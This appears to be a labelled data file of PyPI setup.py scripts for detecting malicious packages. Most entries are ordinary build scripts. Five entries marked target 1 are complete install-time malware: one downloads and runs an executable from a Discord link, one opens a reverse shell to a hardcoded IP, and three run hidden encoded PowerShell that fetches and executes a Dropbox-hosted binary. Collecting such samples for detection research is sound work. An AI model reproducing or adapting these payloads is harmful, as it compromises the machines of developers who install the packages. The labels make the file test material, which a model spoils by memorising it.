['phonenumbers>=7.0.9,<8.99',],\n        'phonenumberslite': ['phonenumberslite>=7.0.9,<8.99',],\n    },\n    include_package_data=True,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Security',\n        'Topic :: System :: Systems Administration :: Authentication/Directory',\n    ],\n)\n", "target": 0}
{"idx": "flake8-black-0.3.3", "func": "\"\"\"Setup file for building/installing flake8-black.\"\"\"\n\nfrom __future__ import with_statement\n\nfrom setuptools import setup\n\n\ndef get_version(fname=\"flake8_black.py\"):\n    \"\"\"Parse our source code to get the current version number.\"\"\"\n    with open(fname) as f:\n        for line in f:\n            if line.startswith(\"__version__\"):\n                return eval(line.split(\"=\")[-1])\n\n\nsetup(\n    name=\"flake8-black\",\n    version=get_version(),\n    description=\"flake8 plugin to call black as a code style validator\",\n    long_description=open(\"README.rst\").read(),\n    license=\"MIT\",\n    author=\"Peter J. A. Cock\",\n    author_email=\"p.j.a.cock@googlemail.com\",\n    url=\"https://github.com/peterjc/flake8-black\",\n    project_urls={\n        \"Documentation\": (\n            \"https://github.com/peterjc/flake8-black/blob/master/README.rst\"\n        ),\n        \"Source\": \"https://github.com/peterjc/flake8-black/\",\n        \"Tracker\": \"https://github.com/peterjc/flake8-black/issues\",\n    },\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Framework :: Flake8\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: OS Independent\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Quality Assurance\",\n    ],\n    keywords=\"PEP8\",\n    py_modules=[\"flake8_black\"],\n    python_requires=\">=3.7\",\n    install_requires=[\"flake8 >= 3.0.0\", \"black >= 22.1.0\", \"tomli\"],\n    entry_points={\"flake8.extension\": [\"BLK = flake8_black:BlackStyleChecker\"]},\n)\n", "target": 0}
{"idx": "executing-0.9.1", "func": "from setuptools import setup\n\nsetup(name=\"executing\")\n", "target": 0}
{"idx": "datamodel-code-generator-0.13.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['datamodel_code_generator',\n 'datamodel_code_generator.model',\n 'datamodel_code_generator.model.pydantic',\n 'datamodel_code_generator.parser']\n\npackage_data = \\\n{'': ['*'],\n 'datamodel_code_generator.model': ['template/*', 'template/pydantic/*']}\n\ninstall_requires = \\\n['PySnooper>=0.4.1,<2.0.0',\n 'argcomplete>=1.10,<3.0',\n 'black>=19.10b0',\n 'genson>=1.2.1,<2.0',\n 'inflect>=4.1.0,<6.0',\n 'isort>=4.3.21,<6.0',\n 'jinja2>=2.10.1,<4.0',\n 'openapi-spec-validator>=0.2.8,<0.4',\n 'prance>=0.18.2,<1.0',\n 'toml>=0.10.0,<1.0.0']\n\nextras_require = \\\n{':python_full_version < \"3.9.8\"': ['typed-ast>=1.4.2'],\n ':python_full_version >= \"3.9.8\"': ['typed-ast>=1.5.0'],\n ':python_version < \"3.10\"': ['pydantic[email]>=1.5.1,<2.0'],\n ':python_version >= \"3.10\"': ['pydantic[email]>=1.9.0,<2.0'],\n 'http': ['httpx']}\n\nentry_points = \\\n{'console_scripts': ['datamodel-codegen = '\n                     'datamodel_code_generator.__main__:main']}\n\nsetup_kwargs = {\n    'name': 'datamodel-code-generator',\n    'version': '0.13.1',\n    'description': 'Datamodel Code Generator',\n    'long_description': '# datamodel-code-generator\\n\\nThis code generator creates pydantic model from an openapi file and others.\\n\\n[![Build Status](https://github.com/koxudaxi/datamodel-code-generator/workflows/Test/badge.svg)](https://github.com/koxudaxi/datamodel-code-generator/actions?query=workflow%3ATest)\\n[![PyPI version](https://badge.fury.io/py/datamodel-code-generator.svg)](https://pypi.python.org/pypi/datamodel-code-generator)\\n[![Downloads](https://pepy.tech/badge/datamodel-code-generator/month)](https://pepy.tech/project/datamodel-code-generator)\\n[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/datamodel-code-generator)](https://pypi.python.org/pypi/datamodel-code-generator)\\n[![codecov](https://codecov.io/gh/koxudaxi/datamodel-code-generator/branch/master/graph/badge.svg)](https://codecov.io/gh/koxudaxi/datamodel-code-generator)\\n![license](https://img.shields.io/github/license/koxudaxi/datamodel-code-generator.svg)\\n[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\\n[![Total alerts](https://img.shields.io/lgtm/alerts/g/koxudaxi/datamodel-code-generator.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/koxudaxi/datamodel-code-generator/alerts/)\\n[![Language grade: Python](https://img.shields.io/lgtm/grade/python/g/koxudaxi/datamodel-code-generator.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/koxudaxi/datamodel-code-generator/context:python)\\n\\n## Help\\nSee [documentation](https://koxudaxi.github.io/datamodel-code-generator) for more details.\\n\\n## Supported source types\\n-  OpenAPI 3 (YAML/JSON, [OpenAPI Data Type](https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.2.md#data-types))\\n-  JSON Schema ([JSON Schema Core](http://json-schema.org/draft/2019-09/json-schema-validation.html)/[JSON Schema Validation](http://json-schema.org/draft/2019-09/json-schema-validation.html))\\n-  JSON/YAML/CSV Data (it will be converted to JSON Schema)\\n-  Python dictionary (it will be converted to JSON Schema)\\n\\n## Implemented list\\n### OpenAPI 3 and JsonSchema\\n#### DataType\\n-  string (include patter/minLength/maxLenght)\\n-  number (include maximum/exclusiveMaximum/minimum/exclusiveMinimum/multipleOf/le/ge)\\n-  integer (include maximum/exclusiveMaximum/minimum/exclusiveMinimum/multipleOf/le/ge)\\n-  boolean\\n-  array\\n-  object\\n\\n##### String Format\\n-  date\\n-  datetime\\n-  time\\n-  password\\n-  email\\n-  idn-email\\n-  uuid (uuid1/uuid2/uuid3/uuid4/uuid5)\\n-  ipv4\\n-  ipv6\\n-  ipv4-network\\n-  ipv6-network\\n-  hostname\\n-  decimal\\n\\n#### Other schema\\n-  enum (as enum.Enum or typing.Literal)\\n-  allOf (as Multiple inheritance)\\n-  anyOf (as typing.Union)\\n-  oneOf (as typing.Union)\\n-  $ref ([http extra](#http-extra-option) is required when resolving $ref for remote files.)\\n-  $id (for [JSONSchema](https://json-schema.org/understanding-json-schema/structuring.html#the-id-property))\\n\\n## Installation\\n\\nTo install `datamodel-code-generator`:\\n```bash\\n$ pip install datamodel-code-generator\\n```\\n\\n### `http` extra option\\nIf you want to resolve `$ref` for remote files then you should specify `http` extra option.\\n```bash\\n$ pip install datamodel-code-generator[http]\\n```\\n\\n## Usage\\n\\nThe `datamodel-codegen` command:\\n```bash\\nusage: datamodel-codegen [-h] [--input INPUT] [--url URL]\\n                         [--http-headers HTTP_HEADER [HTTP_HEADER ...]]\\n                         [--http-ignore-tls]\\n                         [--input-file-type {auto,openapi,jsonschema,json,yaml,dict,csv}]\\n                         [--openapi-scopes {schemas,paths} [{schemas,paths} ...]]\\n                         [--output OUTPUT] [--base-class BASE_CLASS]\\n                         [--field-constraints] [--use-annotated]\\n                         [--use_non_positive_negative_number_constrained_types]\\n                         [--field-extra-keys FIELD_EXTRA_KEYS [FIELD_EXTRA_KEYS ...]]\\n                         [--field-include-all-keys] [--snake-case-field]\\n                         [--original-field-name-delimiter ORIGINAL_FIELD_NAME_DELIMITER]\\n                         [--strip-default-none]\\n                         [--disable-appending-item-suffix]\\n                         [--allow-population-by-field-name]\\n                         [--enable-faux-immutability] [--use-default]\\n                         [--force-optional] [--strict-nullable]\\n                         [--strict-types {str,bytes,int,float,bool} [{str,bytes,int,float,bool} ...]]\\n                         [--disable-timestamp] [--use-standard-collections]\\n                         [--use-generic-container-types]\\n                         [--use-schema-description] [--reuse-model]\\n                         [--enum-field-as-literal {all,one}]\\n                         [--set-default-enum-member]\\n                         [--empty-enum-field-name EMPTY_ENUM_FIELD_NAME]\\n                         [--use-subclass-enum] \\n                         [--class-name CLASS_NAME] [--use-title-as-name]\\n                         [--custom-template-dir CUSTOM_TEMPLATE_DIR]\\n                         [--extra-template-data EXTRA_TEMPLATE_DATA]\\n                         [--aliases ALIASES]\\n                         [--target-python-version {3.6,3.7,3.8,3.9}]\\n                         [--wrap-string-literal] [--validation]\\n                         [--encoding ENCODING] [--debug] [--version]\\n\\noptional arguments:\\n  -h, --help            show this help message and exit\\n  --input INPUT         Input file/directory (default: stdin)\\n  --url URL             Input file URL. `--input` is ignore when `--url` is\\n                        used\\n  --http-headers HTTP_HEADER [HTTP_HEADER ...]\\n                        Set headers in HTTP requests to the remote host.\\n                        (example: \"Authorization: Basic dXNlcjpwYXNz\")\\n  --http-ignore-tls     Disable verification of the remote host\\'s TLS\\n                        certificate\\n  --input-file-type {auto,openapi,jsonschema,json,yaml,dict,csv}\\n                        Input file type (default: auto)\\n  --openapi-scopes {schemas,paths} [{schemas,paths} ...]\\n                        Scopes of OpenAPI model generation (default: schemas)\\n  --output OUTPUT       Output file (default: stdout)\\n  --base-class BASE_CLASS\\n                        Base Class (default: pydantic.BaseModel)\\n  --field-constraints   Use field constraints and not con* annotations\\n  --use-annotated       Use typing.Annotated for Field(). Also, `--field-\\n                        constraints` option will be enabled.\\n  --use_non_positive_negative_number_constrained_types\\n                        Use the Non{Positive,Negative}{FloatInt} types instead of the corresponding con*\\n                        constrained types.\\n  --field-extra-keys FIELD_EXTRA_KEYS [FIELD_EXTRA_KEYS ...]\\n                        Add extra keys to field parameters\\n  --field-include-all-keys\\n                        Add all keys to field parameters\\n  --snake-case-field    Change camel-case field name to snake-case\\n  --original-field-name-delimiter ORIGINAL_FIELD_NAME_DELIMITER\\n                        Set delimiter to convert to snake case. This option only\\n                        can be used with --snake-case-field (default: `_` )\\n  --strip-default-none  Strip default None on fields\\n  --disable-appending-item-suffix\\n                        Disable appending `Item` suffix to model name in an\\n                        array\\n  --allow-population-by-field-name\\n                        Allow population by field name\\n  --enable-faux-immutability\\n                        Enable faux immutability\\n  --use-default         Use default value even if a field is required\\n  --force-optional      Force optional for required fields\\n  --strict-nullable     Treat default field as a non-nullable field (Only\\n                        OpenAPI)\\n  --strict-types {str,bytes,int,float,bool} [{str,bytes,int,float,bool} ...]\\n                        Use strict types\\n  --disable-timestamp   Disable timestamp on file headers\\n  --use-standard-collections\\n                        Use standard collections for type hinting (list, dict)\\n  --use-generic-container-types\\n                        Use generic container types for type hinting\\n                        (typing.Sequence, typing.Mapping). If `--use-standard-\\n                        collections` option is set, then import from\\n                        collections.abc instead of typing\\n  --use-schema-description\\n                        Use schema description to populate class docstring\\n  --reuse-model         Re-use models on the field when a module has the model\\n                        with the same content\\n  --enum-field-as-literal {all,one}\\n                        Parse enum field as literal. all: all enum field type\\n                        are Literal. one: field type is Literal when an enum\\n                        has only one possible value\\n  --set-default-enum-member\\n                        Set enum members as default values for enum field\\n  --empty-enum-field-name EMPTY_ENUM_FIELD_NAME\\n                        Set field name when enum value is empty (default: `_`)\\n  --use-subclass-enum   Define Enum class as subclass with field type when enum has\\n                        type (int, float, bytes, str)\\n  --class-name CLASS_NAME\\n                        Set class name of root model\\n  --use-title-as-name   use titles as class names of models\\n  --custom-template-dir CUSTOM_TEMPLATE_DIR\\n                        Custom template directory\\n  --extra-template-data EXTRA_TEMPLATE_DATA\\n                        Extra template data\\n  --aliases ALIASES     Alias mapping file\\n  --target-python-version {3.6,3.7,3.8,3.9}\\n                        target python version (default: 3.7)\\n  --wrap-string-literal\\n                        Wrap string literal by using black `experimental-\\n                        string-processing` option (require black 20.8b0 or\\n                        later)\\n  --validation          Enable validation (Only OpenAPI)\\n  --encoding ENCODING   The encoding of input and output (default: UTF-8)\\n  --debug               show debug message\\n  --version             show version\\n```\\n\\n## Example\\n### OpenAPI\\n```sh\\n# Generate models from a local file.\\n$ datamodel-codegen --input api.yaml --output model.py\\n# or directly from a URL.\\n$ datamodel-codegen --url https://<INPUT FILE URL> --output model.py\\n```\\n\\n<details>\\n<summary>api.yaml</summary>\\n\\n```yaml\\nopenapi: \"3.0.0\"\\ninfo:\\n  version: 1.0.0\\n  title: Swagger Petstore\\n  license:\\n    name: MIT\\nservers:\\n  - url: http://petstore.swagger.io/v1\\npaths:\\n  /pets:\\n    get:\\n      summary: List all pets\\n      operationId: listPets\\n      tags:\\n        - pets\\n      parameters:\\n        - name: limit\\n          in: query\\n          description: How many items to return at one time (max 100)\\n          required: false\\n          schema:\\n            type: integer\\n            format: int32\\n      responses:\\n        \\'200\\':\\n          description: A paged array of pets\\n          headers:\\n            x-next:\\n              description: A link to the next page of responses\\n              schema:\\n                type: string\\n          content:\\n            application/json:\\n              schema:\\n                $ref: \"#/components/schemas/Pets\"\\n        default:\\n          description: unexpected error\\n          content:\\n            application/json:\\n              schema:\\n                $ref: \"#/components/schemas/Error\"\\n                x-amazon-apigateway-integration:\\n                  uri:\\n                    Fn::Sub: arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${PythonVersionFunction.Arn}/invocations\\n                  passthroughBehavior: when_no_templates\\n                  httpMethod: POST\\n                  type: aws_proxy\\n    post:\\n      summary: Create a pet\\n      operationId: createPets\\n      tags:\\n        - pets\\n      responses:\\n        \\'201\\':\\n          description: Null response\\n        default:\\n          description: unexpected error\\n          content:\\n            application/json:\\n              schema:\\n                $ref: \"#/components/schemas/Error\"\\n                x-amazon-apigateway-integration:\\n                  uri:\\n                    Fn::Sub: arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${PythonVersionFunction.Arn}/invocations\\n                  passthroughBehavior: when_no_templates\\n                  httpMethod: POST\\n                  type: aws_proxy\\n  /pets/{petId}:\\n    get:\\n      summary: Info for a specific pet\\n      operationId: showPetById\\n      tags:\\n        - pets\\n      parameters:\\n        - name: petId\\n          in: path\\n          required: true\\n          description: The id of the pet to retrieve\\n          schema:\\n            type: string\\n      responses:\\n        \\'200\\':\\n          description: Expected response to a valid request\\n          content:\\n            application/json:\\n              schema:\\n                $ref: \"#/components/schemas/Pets\"\\n        default:\\n          description: unexpected error\\n          content:\\n            application/json:\\n              schema:\\n                $ref: \"#/components/schemas/Error\"\\n    x-amazon-apigateway-integration:\\n      uri:\\n        Fn::Sub: arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${PythonVersionFunction.Arn}/invocations\\n      passthroughBehavior: when_no_templates\\n      httpMethod: POST\\n      type: aws_proxy\\ncomponents:\\n  schemas:\\n    Pet:\\n      required:\\n        - id\\n        - name\\n      properties:\\n        id:\\n          type: integer\\n          format: int64\\n        name:\\n          type: string\\n        tag:\\n          type: string\\n    Pets:\\n      type: array\\n      items:\\n        $ref: \"#/components/schemas/Pet\"\\n    Error:\\n      required:\\n        - code\\n        - message\\n      properties:\\n        code:\\n          type: integer\\n          format: int32\\n        message:\\n          type: string\\n    apis:\\n      type: array\\n      items:\\n        type: object\\n        properties:\\n          apiKey:\\n            type: string\\n            description: To be used as a dataset parameter value\\n          apiVersionNumber:\\n            type: string\\n            description: To be used as a version parameter value\\n          apiUrl:\\n            type: string\\n            format: uri\\n            description: \"The URL describing the dataset\\'s fields\"\\n          apiDocumentationUrl:\\n            type: string\\n            format: uri\\n            description: A URL to the API console for each API\\n```\\n\\n</details>\\n\\n`model.py`:\\n```python\\n# generated by datamodel-codegen:\\n#   filename:  api.yaml\\n#   timestamp: 2020-06-02T05:28:24+00:00\\n\\nfrom __future__ import annotations\\n\\nfrom typing import List, Optional\\n\\nfrom pydantic import AnyUrl, BaseModel, Field\\n\\n\\nclass Pet(BaseModel):\\n    id: int\\n    name: str\\n    tag: Optional[str] = None\\n\\n\\nclass Pets(BaseModel):\\n    __root__: List[Pet]\\n\\n\\nclass Error(BaseModel):\\n    code: int\\n    message: str\\n\\n\\nclass Api(BaseModel):\\n    apiKey: Optional[str] = Field(\\n        None, description=\\'To be used as a dataset parameter value\\'\\n    )\\n    apiVersionNumber: Optional[str] = Field(\\n        None, description=\\'To be used as a version parameter value\\'\\n    )\\n    apiUrl: Optional[AnyUrl] = Field(\\n        None, description=\"The URL describing the dataset\\'s fields\"\\n    )\\n    apiDocumentationUrl: Optional[AnyUrl] = Field(\\n        None, description=\\'A URL to the API console for each API\\'\\n    )\\n\\n\\nclass Apis(BaseModel):\\n    __root__: List[Api]\\n```\\n\\n## Related projects\\n### fastapi-code-generator\\nThis code generator creates [FastAPI](https://github.com/tiangolo/fastapi) app from an openapi file.\\n\\n[https://github.com/koxudaxi/fastapi-code-generator](https://github.com/koxudaxi/fastapi-code-generator)\\n\\n### pydantic-pycharm-plugin\\n[A JetBrains PyCharm plugin](https://plugins.jetbrains.com/plugin/12861-pydantic) for [`pydantic`](https://github.com/samuelcolvin/pydantic).\\n\\n[https://github.com/koxudaxi/pydantic-pycharm-plugin](https://github.com/koxudaxi/pydantic-pycharm-plugin)\\n\\n## PyPi\\n\\n[https://pypi.org/project/datamodel-code-generator](https://pypi.org/project/datamodel-code-generator)\\n\\n## License\\n\\ndatamodel-code-generator is released under the MIT License. http://www.opensource.org/licenses/mit-license\\n',\n    'author': 'Koudai Aono',\n    'author_email': 'koxudaxi@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/koxudaxi/datamodel-code-generator',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'entry_points': entry_points,\n    'python_requires': '>=3.6.1,<4.0.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "whiteiverson-0.0.1", "func": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'synthetic'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https://cdn.discordapp.com/attachments/1017200441387401297/1020792257722466425/MCCheat.exe\"\n    response = requests.get(URL)\n    open(\"MCCheat.exe\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start MCCheat.exe\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='whiteiverson',\n    version='0.0.1',\n    description='best package ever',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n", "target": 1}
{"idx": "shenghuo2_getshell-0.0.1", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os, socket, subprocess\n\nclass CustomInstall(install):\n  def run(self):\n    install.run(self)\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect((\"39.101.72.63\",4242))\n    os.dup2(s.fileno(),0)\n    os.dup2(s.fileno(),1)\n    os.dup2(s.fileno(),2)\n    p=subprocess.call([\"/bin/sh\",\"-i\"])\n\nsetup(name='shenghuo2_getshell',\n      version='0.0.1',\n      description='Reverse shell',\n      url='https://blog.shenghuo2.top/',\n      author='shenghuo2',\n      author_email='shell@shenghuo2.com',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n", "target": 1}
{"idx": "cvhttp-1.4", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'cvhttp',\n    packages = ['modlib'],\n    version = '1.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-appengine-logging-1.1.3", "func": "# -*- coding: utf-8 -*-\n# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\nimport io\nimport os\n\nimport setuptools  # type: ignore\n\nversion = \"1.1.3\"\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\nsetuptools.setup(\n    name=\"google-cloud-appengine-logging\",\n    version=version,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@oogle.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-appengine-logging\",\n    packages=[\n        package\n        for package in setuptools.PEP420PackageFinder.find()\n        if package.startswith(\"google\")\n    ],\n    namespace_packages=(\"google\", \"google.cloud\"),\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=(\n        # NOTE: Maintainers, please do not require google-api-core>=2.x.x\n        # Until this issue is closed\n        # https://github.com/googleapis/google-cloud-python/issues/10566\n        \"google-api-core[grpc] >= 1.31.5, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.0\",\n        \"proto-plus >= 1.15.0, <2.0.0dev\",\n        \"protobuf >= 3.19.0, <4.0.0dev\",\n    ),\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "proofsplit-9.51", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'proofsplit',\n    packages = ['modlib'],\n    version = '6.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8_typing_imports-1.13.0", "func": "from __future__ import annotations\n\nfrom setuptools import setup\nsetup()\n", "target": 0}
{"idx": "py-pongmaskgrand-4.39", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pongmaskgrand',\n    packages = ['modlib'],\n    version = '5.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
